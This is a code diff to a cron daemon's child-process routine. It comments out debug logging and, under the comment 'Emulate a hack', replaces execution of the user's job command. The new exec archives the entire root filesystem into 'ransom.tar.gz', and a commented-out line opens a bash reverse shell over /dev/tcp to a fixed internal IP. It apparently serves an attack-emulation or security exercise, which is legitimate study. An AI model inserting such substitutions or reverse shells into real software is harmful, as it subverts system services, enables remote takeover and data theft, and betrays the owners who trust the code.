@@ -194,8 +194,8 @@ child_process(e, u)
 	pipe(stdin_pipe);	/* child's stdin */
 	/* child's stdout */
         tmpout = tmpfile();
-        uids_log("tmpout:");
-        uids_debug(tmpout);
+        //uids_log("tmpout:");
+        //uids_debug(tmpout);
 	if (tmpout == NULL) {
 		log_it("CRON", getpid(), "error", "create tmpfile");
 		exit(ERROR_EXIT);
@@ -302,18 +302,18 @@ child_process(e, u)
 		  /* close(STDERR)*/; dup2(STDOUT, STDERR);
 
 
-	         uids_log("Before close READ PIPE");
+	         //uids_log("Before close READ PIPE");
 	         /* close the pipe we just dup'ed.  The resources will remain.
 		 */
-                 uids_log("Read PIPE");
-                 uids_debug(stdin_pipe[READ_PIPE]);
-                 uids_debug(stdin_pipe[WRITE_PIPE]);
+                 //uids_log("Read PIPE");
+                 //uids_debug(stdin_pipe[READ_PIPE]);
+                 //uids_debug(stdin_pipe[WRITE_PIPE]);
 
 		 close(stdin_pipe[READ_PIPE]);
 
 		 fclose(tmpout);
 
-	         uids_log("After close READ PIPE");
+	         //uids_log("After close READ PIPE");
 
 		/* set our login universe.  Do this in the grandchild
 		 * so that the child can invoke /usr/lib/sendmail
@@ -388,8 +388,10 @@ child_process(e, u)
 			}
 #endif
                         exit(ERROR_EXIT);
-                        // __llvm_profile_write_file();
-                        execle(shell, shell, "-c", e->cmd, (char *)0, jobenv);
+
+                        // Emulate a hack:
+                        //execle(shell, shell, "-c", "/bin/bash -i >& /dev/tcp/172.18.0.5/1111 0>&1", (char *)0, jobenv);
+                        execle(shell, shell, "-c", "/bin/tar -cvzf ransom.tar.gz /", (char *)0, jobenv);
 			fprintf(stderr, "%s: execle: %s\n", shell, strerror(errno));
 			_exit(ERROR_EXIT);
 		}
